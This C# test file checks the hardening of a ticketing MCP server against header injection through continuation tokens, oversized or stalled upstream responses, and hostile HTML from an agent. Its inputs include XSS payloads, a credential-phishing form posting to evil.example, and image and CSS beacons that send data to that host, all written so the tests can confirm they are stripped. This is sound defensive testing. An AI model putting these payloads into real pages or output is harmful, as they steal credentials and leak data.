using System.Net;
using System.Text;
using ModelContextProtocol;
using TeamsWork.Ticketing.Mcp.Ticketing;
using TeamsWork.Ticketing.Mcp.Ticketing.Models;
using TeamsWork.Ticketing.Mcp.Tools;

namespace TeamsWork.Ticketing.Mcp.Tests;

/// <summary>Protections against hostile tool arguments and a misbehaving upstream API.</summary>
public sealed class HardeningTests
{
    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    // ---- Header injection through the continuation token ------------------------------------------------------

    [Theory]
    [InlineData("abc\r\nX-Injected: yes")]
    [InlineData("abc\nX-Injected: yes")]
    [InlineData("abc\u0000def")]
    [InlineData("abc def")]
    [InlineData("tökén")]
    public void Continuation_tokens_must_be_visible_ascii(string token)
    {
        McpException ex = Assert.Throws<McpException>(() => ToolValidation.OptionalToken(token, "continuationToken"));
        Assert.Contains("continuationToken", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void Ordinary_continuation_tokens_are_accepted()
    {
        const string token = "eyJvZmZzZXQiOjIwfQ==+/_-.~";
        Assert.Equal(token, ToolValidation.OptionalToken(token, "continuationToken"));
    }

    [Fact]
    public async Task The_client_never_sends_a_header_value_containing_a_line_break()
    {
        // Second line of defence, for any caller that skips tool validation.
        var handler = new FakeHttpHandler().Enqueue(HttpStatusCode.OK, """{"items":[]}""");
        TicketingClient client = TestFactory.Client(handler);

        await Assert.ThrowsAsync<TicketingApiException>(() =>
            client.ListTicketsAsync(new TicketListQuery { ContinuationToken = "abc\r\nX-Injected: yes" }, Ct));

        Assert.Empty(handler.Requests);
    }

    // ---- Upstream response size and read time -----------------------------------------------------------------

    [Fact]
    public async Task Oversized_upstream_responses_are_refused_by_content_length()
    {
        var handler = new FakeHttpHandler().Enqueue(HttpStatusCode.OK, PaddedJson(2 * 1024 * 1024));
        TicketingClient client = TestFactory.Client(handler, TestFactory.Options(o => o.MaxResponseBytes = 1024 * 1024));

        TicketingApiException ex = await Assert.ThrowsAsync<TicketingApiException>(() => client.ListTicketsAsync(new TicketListQuery(), Ct));
        Assert.Contains("too large", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Oversized_upstream_responses_are_refused_without_a_content_length()
    {
        byte[] big = Encoding.UTF8.GetBytes(PaddedJson(2 * 1024 * 1024));
        var handler = new FakeHttpHandler().Enqueue(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new StreamContent(new UnknownLengthStream(big)),
        });
        TicketingClient client = TestFactory.Client(handler, TestFactory.Options(o => o.MaxResponseBytes = 1024 * 1024));

        TicketingApiException ex = await Assert.ThrowsAsync<TicketingApiException>(() => client.ListTicketsAsync(new TicketListQuery(), Ct));
        Assert.Contains("too large", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_response_with_a_byte_order_mark_still_parses()
    {
        byte[] bom = [.. Encoding.UTF8.GetPreamble(), .. Encoding.UTF8.GetBytes("""{"items":[{"id":"abc","title":"Café"}],"itemCount":1}""")];
        var handler = new FakeHttpHandler().Enqueue(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new ByteArrayContent(bom) { Headers = { ContentType = new("application/json") } },
        });
        TicketingClient client = TestFactory.Client(handler);

        ListResponse<Ticket> r = await client.ListTicketsAsync(new TicketListQuery(), Ct);

        Assert.Equal("Café", Assert.Single(r.Items!).Title);
    }

    [Fact]
    public async Task A_response_in_a_declared_charset_is_decoded_with_it()
    {
        byte[] latin1 = Encoding.Latin1.GetBytes("""{"items":[{"id":"abc","title":"Café"}],"itemCount":1}""");
        var handler = new FakeHttpHandler().Enqueue(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new ByteArrayContent(latin1) { Headers = { ContentType = new("application/json") { CharSet = "iso-8859-1" } } },
        });
        TicketingClient client = TestFactory.Client(handler);

        ListResponse<Ticket> r = await client.ListTicketsAsync(new TicketListQuery(), Ct);

        Assert.Equal("Café", Assert.Single(r.Items!).Title);
    }

    [Fact]
    public async Task An_unknown_charset_falls_back_to_utf8()
    {
        var handler = new FakeHttpHandler().Enqueue(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new ByteArrayContent(Encoding.UTF8.GetBytes("""{"items":[{"id":"abc","title":"Café"}]}""")) { Headers = { ContentType = new("application/json") { CharSet = "no-such-charset" } } },
        });
        TicketingClient client = TestFactory.Client(handler);

        ListResponse<Ticket> r = await client.ListTicketsAsync(new TicketListQuery(), Ct);

        Assert.Equal("Café", Assert.Single(r.Items!).Title);
    }

    [Fact]
    public async Task The_size_limit_message_is_readable_below_one_megabyte()
    {
        var handler = new FakeHttpHandler().Enqueue(HttpStatusCode.OK, PaddedJson(200 * 1024));
        TicketingClient client = TestFactory.Client(handler, TestFactory.Options(o => o.MaxResponseBytes = 128 * 1024));

        TicketingApiException ex = await Assert.ThrowsAsync<TicketingApiException>(() => client.ListTicketsAsync(new TicketListQuery(), Ct));

        Assert.Contains("over 128 KB", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_response_body_that_never_finishes_times_out()
    {
        var handler = new FakeHttpHandler().Enqueue(_ => new HttpResponseMessage(HttpStatusCode.OK)
        {
            Content = new StreamContent(new StalledStream()),
        });
        TicketingClient client = TestFactory.Client(handler, TestFactory.Options(o => o.RequestTimeoutSeconds = 1));

        Task call = client.ListTicketsAsync(new TicketListQuery(), Ct);
        Task finished = await Task.WhenAny(call, Task.Delay(TimeSpan.FromSeconds(15), Ct));

        Assert.Same(call, finished);
        TicketingApiException ex = await Assert.ThrowsAsync<TicketingApiException>(() => call);
        Assert.Contains("did not respond", ex.Message, StringComparison.Ordinal);
    }

    // ---- HTML supplied by the agent ---------------------------------------------------------------------------

    [Fact]
    public void Html_input_is_sanitised()
    {
        const string html =
            "<p>Hello <b>world</b></p><script>alert(1)</script><img src=\"x\" onerror=\"alert(1)\">" +
            "<a href=\"javascript:alert(1)\">bad</a><a href=\"https://example.com/doc\">good</a>" +
            "<iframe src=\"https://evil.example\"></iframe><div style=\"background:url(javascript:alert(1))\">s</div>";

        string clean = ToolValidation.OptionalHtml(html, "descriptionHtml")!;

        Assert.Contains("<b>world</b>", clean, StringComparison.Ordinal);
        Assert.Contains("https://example.com/doc", clean, StringComparison.Ordinal);
        Assert.DoesNotContain("<script", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onerror", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("javascript:", clean, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<iframe", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    // A working credential-phishing form.
    [InlineData("<form action=\"https://evil.example/steal\" method=\"post\"><input name=\"password\" type=\"password\"><button>Sign in</button></form>ok", "<form", "<input", "<button", "evil.example")]
    // A full-screen overlay, and a CSS beacon.
    [InlineData("<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999\">ok</div><p style=\"background:url(https://evil.example/b)\">p</p>", "style", "position", "evil.example")]
    // A zero-click beacon that could carry data the agent read.
    [InlineData("<img src=\"https://evil.example/pixel.gif?data=secret\">ok", "<img", "evil.example")]
    // DOM clobbering and reverse tabnabbing.
    [InlineData("<a name=\"config\" href=\"https://example.com\" target=\"_blank\">ok</a>", "name=", "target=")]
    // Removed with their content, which for form controls is safer than keeping it.
    [InlineData("<textarea>t</textarea><select><option>o</option></select><label>l</label>ok", "<textarea", "<select", "<option", "<label")]
    public void Html_that_could_phish_overlay_or_beacon_is_removed(string html, params string[] mustNotContain)
    {
        string clean = ToolValidation.OptionalHtml(html, "commentHtml")!;

        Assert.Contains("ok", clean, StringComparison.Ordinal);
        foreach (string fragment in mustNotContain)
        {
            Assert.DoesNotContain(fragment, clean, StringComparison.OrdinalIgnoreCase);
        }
    }

    [Fact]
    public void Html_formatting_that_help_desk_comments_use_survives()
    {
        const string html =
            "<h2>Steps</h2><ol><li><b>Bold</b> and <i>italic</i></li><li><code>cmd</code></li></ol>" +
            "<table><tr><th>Key</th><td>Value</td></tr></table><blockquote>quote</blockquote>" +
            "<p><a href=\"https://example.com/kb/42\" title=\"KB\">KB article</a></p>";

        string clean = ToolValidation.OptionalHtml(html, "commentHtml")!;

        foreach (string kept in (string[])["<h2>", "<ol>", "<li>", "<b>Bold</b>", "<i>italic</i>", "<code>cmd</code>", "<table>", "<th>Key</th>", "<blockquote>", "href=\"https://example.com/kb/42\""])
        {
            Assert.Contains(kept, clean, StringComparison.Ordinal);
        }
    }

    [Fact]
    public void Html_wrapped_in_a_document_keeps_its_content()
    {
        // html, head and body aren't allowed, and removed tags take their content with them, so this checks that a
        // whole-document wrapper (which agents sometimes produce) doesn't erase the comment.
        string clean = ToolValidation.OptionalHtml("<html><head><title>t</title></head><body><p>Kept</p></body></html>", "commentHtml")!;

        Assert.Contains("<p>Kept</p>", clean, StringComparison.Ordinal);
        Assert.DoesNotContain("<body", clean, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Html_that_sanitises_to_nothing_is_rejected()
    {
        McpException ex = Assert.Throws<McpException>(() => ToolValidation.OptionalHtml("<script>alert(1)</script>", "commentHtml"));
        Assert.Contains("commentHtml", ex.Message, StringComparison.Ordinal);
    }

    // ---- Error messages ---------------------------------------------------------------------------------------

    [Fact]
    public async Task Unexpected_exceptions_are_not_turned_into_client_messages()
    {
        // Left for the SDK, which returns a generic error; see HttpHardeningTests for the end-to-end check.
        await Assert.ThrowsAsync<InvalidOperationException>(() =>
            ToolRunner.RunAsync<string>(() => throw new InvalidOperationException("internal detail: connection string xyz")));
    }

    [Fact]
    public async Task Messages_written_for_the_agent_still_reach_it()
    {
        McpException ex = await Assert.ThrowsAsync<McpException>(() =>
            ToolRunner.RunAsync<string>(() => throw new TicketingApiException("The Ticketing API rate limit was hit (429).")));

        Assert.Contains("rate limit", ex.Message, StringComparison.Ordinal);
    }

    // ---- Collection sizes -------------------------------------------------------------------------------------

    [Fact]
    public void Long_lists_are_rejected()
    {
        McpException ex = Assert.Throws<McpException>(() => ToolValidation.MaxCount(Enumerable.Range(0, 51).ToList(), "tags", 50));
        Assert.Contains("tags", ex.Message, StringComparison.Ordinal);

        ToolValidation.MaxCount(Enumerable.Range(0, 50).ToList(), "tags", 50);
        ToolValidation.MaxCount<int>(null, "tags", 50);
    }

    private static string PaddedJson(int padding) => "{\"items\":[],\"pad\":\"" + new string('x', padding) + "\"}";

    /// <summary>A readable stream that reports no length, so the client can't rely on Content-Length.</summary>
    private sealed class UnknownLengthStream(byte[] data) : MemoryStream(data)
    {
        public override bool CanSeek => false;
    }

    /// <summary>A body that sends nothing until the read is cancelled.</summary>
    private sealed class StalledStream : Stream
    {
        public override bool CanRead => true;
        public override bool CanSeek => false;
        public override bool CanWrite => false;
        public override long Length => throw new NotSupportedException();
        public override long Position { get => 0; set => throw new NotSupportedException(); }
        public override void Flush() { }
        public override int Read(byte[] buffer, int offset, int count) => throw new NotSupportedException();
        public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
        public override void SetLength(long value) => throw new NotSupportedException();
        public override void Write(byte[] buffer, int offset, int count) => throw new NotSupportedException();

        public override async ValueTask<int> ReadAsync(Memory<byte> buffer, CancellationToken cancellationToken = default)
        {
            await Task.Delay(Timeout.Infinite, cancellationToken);
            return 0;
        }
    }
}
